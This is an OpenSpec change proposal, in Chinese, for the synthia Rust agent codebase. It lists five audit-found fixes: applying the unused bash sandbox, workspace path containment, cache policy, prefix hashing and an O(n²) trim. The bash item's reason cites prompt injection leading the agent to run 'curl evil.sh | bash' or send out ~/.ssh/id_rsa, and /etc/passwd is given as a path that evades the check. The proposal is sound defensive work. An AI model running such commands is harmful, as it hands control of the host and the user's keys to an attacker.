## Why

对抗性审计（4 视角：架构/安全/性能/生产就绪）发现 5 个未被任何现有 openspec change 覆盖的高 ROI 修复项：1 个安全单点失效（bash 沙箱被显式忽略，`_sandbox_attempt` 下划线丢弃）、1 个安全防线薄弱（文件工具路径校验只挡 `../`，`/etc/passwd` 直通）、1 个性能浪费（guardian 路径 `cache_policy: None`，~$19.7K/年）、1 个可观测性盲区（prefix_tracker 只 hash system_bytes）、1 个 O(n²) 反模式（pipeline.rs `remove(0)`）。这些修复成本极低（30 分钟-4 小时）但影响显著，应立即捕获为独立变更以脱离 project_memory 过时的 P0 清单。

## What Changes

**Bash 沙箱实际应用（U1 安全单点失效）**
- From: [ToolAdapter::execute](file:///home/crochee/workspace/synthia/crates/synthia-tool-orchestrator/src/lib.rs#L731) 形参命名为 `_sandbox_attempt`（下划线 = 显式忽略）；[bash executor](file:///home/crochee/workspace/synthia/crates/synthia-tool-bash/src/bash_tool/executor.rs#L32) 直接 `Command::new("bash").arg("-c")`，从不调用 `SandboxAttempt::wrap()`
- To: bash executor 与后台 spawn 路径显式调用 `SandboxAttempt::wrap(&mut command)`；沙箱 unavailable 时按 `SandboxPolicy::on_unavailable()` 决策（Standard → Deny 而非裸跑）
- Reason: bash 是唯一执行任意 attacker-influenced code 的工具，`--unshare-all`/`--die-with-parent`/只读 bind 全部对 bash 一行都没生效；prompt injection 可诱导 `curl evil.sh | bash`、外发 `~/.ssh/id_rsa`
- Impact: breaking（沙箱 unavailable 时 bash 将 Deny 而非裸跑，需更新测试）

**文件工具路径校验改为 workspace 包含（U2 安全）**
- From: [check_path_traversal](file:///home/crochee/workspace/synthia/crates/synthia-permission/src/checker/checker.rs#L229-L240) 仅 `path.contains("../") || path.contains("..\\")`，`read_file("/etc/passwd")` 通过
- To: 参照 [codex safety.rs:138-193](file:///home/crochee/workspace/codex/codex-rs/core/src/safety.rs#L138-L193) 的纯路径 `normalize()` + workspace 前缀包含判定
- Reason: 文件工具不 spawn 子进程，沙箱层不会兜底——`../` 子串检查是唯一防线，可被绝对路径直接绕过
- Impact: non-breaking（合法 workspace 内路径不受影响）

**Guardian/e2e 路径携带 cache_policy（性能）**
- From: [reviewer.rs:217,313](file:///home/crochee/workspace/synthia/crates/synthia-guardian/src/review/reviewer.rs#L217) 与 [e2e_llm_test.rs:120,200](file:///home/crochee/workspace/synthia/crates/synthia-agent/tests/e2e_llm_test.rs#L120) `cache_policy: None`
- To: 所有 LLM 调用路径携带 `Some(CachePolicy::default())`（或更细粒度的 policy）
- Reason: guardian 每次审查 ~10K token，每 session 触发 2 次，1k/day × 365 × 2 × 10K × ($3 - $0.30)/M = ~$19.7K/年浪费
- Impact: non-breaking（仅添加 cache 标记）

**PrefixTracker hash 范围扩展（可观测性）**
- From: [PrefixTracker::record_pre](file:///home/crochee/workspace/synthia/crates/synthia-context/src/prefix_tracker/tracker.rs#L90-L97) 只 hash `system_bytes`，忽略 tools schema 和 messages 前缀
- To: hash 覆盖 system + tools + messages 前缀（完整 prefix）
- Reason: `stability_ratio` 虚高，掩盖 tools 变更导致的 cache 失效，违反 P9 可观测性
- Impact: non-breaking（仅扩展 hash 输入）

**Prompt assembly O(n²) 修复（性能）**
- From: [pipeline.rs:38-48](file:///home/crochee/workspace/synthia/crates/synthia-context/src/assembler/pipeline.rs#L38-L48) `trimmed.remove(0)` 每次 O(n)，while 循环最多 n 次 → 总 O(n²)
- To: 用 `Vec::drain(start..)` 或维护起始索引，O(n)
- Reason: 200+ 消息时每次 prepare 浪费 1-5ms，累计 100-250ms 延迟
- Impact: non-breaking（纯性能优化）

## Capabilities

### New Capabilities

- `bash-sandbox-application`: bash executor 与后台 spawn 路径必须显式调用 `SandboxAttempt::wrap`，沙箱 unavailable 时按 policy 决策而非裸跑
- `workspace-path-containment`: 文件工具路径校验改为纯路径 `normalize()` + workspace 前缀包含判定，替代 `../` 子串检查
- `guardian-cache-policy`: guardian reviewer 与 e2e 测试路径必须携带 cache_policy，避免 ~$19.7K/年 cache miss 浪费
- `prefix-hash-scope`: PrefixTracker hash 必须覆盖 system + tools + messages 前缀，提供准确的 stability_ratio
- `prompt-assembly-linearity`: prompt assembly 的 ProtectionZone trim 必须为 O(n)，禁止 `Vec::remove(0)`

### Modified Capabilities

无。上述 5 项均为新能力，现有 specs 未覆盖这些具体要求（否则审计不会发现它们缺失）。

## Impact

**受影响代码**：
- `crates/synthia-tool-bash/src/bash_tool/executor.rs`（U1：wrap 调用点）
- `crates/synthia-tool-bash/src/bash_tool/trait_impl.rs`（U1：后台 spawn 路径）
- `crates/synthia-tool-orchestrator/src/lib.rs`（U1：移除 `_sandbox_attempt` 下划线）
- `crates/synthia-permission/src/checker/checker.rs`（U2：path 校验重写）
- `crates/synthia-guardian/src/review/reviewer.rs`（cache_policy 注入）
- `crates/synthia-agent/tests/e2e_llm_test.rs`（cache_policy 注入）
- `crates/synthia-context/src/prefix_tracker/tracker.rs`（hash 范围扩展）
- `crates/synthia-context/src/assembler/pipeline.rs`（O(n²) 修复）

**受影响依赖**：无新依赖；U2 可参考 [codex safety.rs](file:///home/crochee/workspace/codex/codex-rs/core/src/safety.rs#L138-L193) 的纯路径运算实现思路（不引入依赖，只借鉴算法）。

**测试影响**：
- U1 需新增"沙箱 unavailable 时 bash Deny"测试
- U2 需新增"绝对路径越界 Deny"测试
- 其余 3 项为纯内部优化，现有测试应保持通过

**不包含**（已在现有 openspec change 中跟踪）：
- H1 orchestrator wire-in（`wire-tool-orchestrator-into-agent-runtime`）
- H2 user_id 命名空间（`user-id-namespace-and-bash-permission-gate`）
- H3 file 工具非 stub 化（`production-tool-execution-sandbox`）
- H4 SessionInputQueue（`p0-subagent-execution-session-persistence`）
